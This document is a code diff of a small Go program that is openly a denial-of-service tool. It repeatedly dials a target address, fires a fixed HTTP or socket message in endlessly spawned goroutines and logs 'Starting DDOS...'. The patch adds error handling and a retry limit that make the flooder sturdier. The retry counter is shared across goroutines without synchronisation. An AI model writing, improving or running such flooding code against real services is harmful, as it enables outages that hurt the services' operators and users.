@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os"
 	"time"
 )
 
@@ -13,11 +14,12 @@ const (
 	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
 )
 
-func checkServer(opt options.Options) {
+func ddos(opt options.Options) error {
 	conn, err := net.Dial("tcp", opt.Address)
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
+
 	message := ""
 	if opt.Http {
 		message = HttpMessage
@@ -26,41 +28,47 @@ func checkServer(opt options.Options) {
 	}
 	_, err = fmt.Fprint(conn, message)
 	if err != nil {
-		panic(err)
+		return err
 	}
+
 	err = conn.Close()
 	if err != nil {
-		panic(err)
+		return err
 	}
-}
 
-func ddos(opt options.Options) {
-	conn, err := net.Dial("tcp", opt.Address)
-	if err != nil {
-		log.Printf("Couldn't connect to server (%v)...", err)
-		return
-	}
-	message := ""
-	if opt.Http {
-		message = HttpMessage
-	} else {
-		message = SocketMessage
-	}
-	fmt.Fprint(conn, message)
-	conn.Close()
+	return nil
 }
 
 func main() {
 	log.SetFlags(3)
 
 	opt := options.Parse()
+	currentRetryCount := 0
 
-	checkServer(opt)
+	if err := ddos(opt); err != nil {
+		fmt.Printf("Couldn't run test-connect, error: %v...\n", err)
+		os.Exit(1)
+	}
 
 	log.Printf("Starting DDOS...")
 
 	for {
-		go ddos(opt)
+		go func() {
+			err := ddos(opt)
+			if err != nil {
+				fmt.Printf("%v\n", err)
+
+				if opt.MaxRetryCount <= 0 {
+					return
+				}
+
+				if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
+					fmt.Printf("Reached max retry count (%v), exiting...\n", opt.MaxRetryCount)
+					os.Exit(1)
+				}
+			}
+		}()
+
 		time.Sleep(time.Millisecond * time.Duration(opt.Delay))
 	}
 }
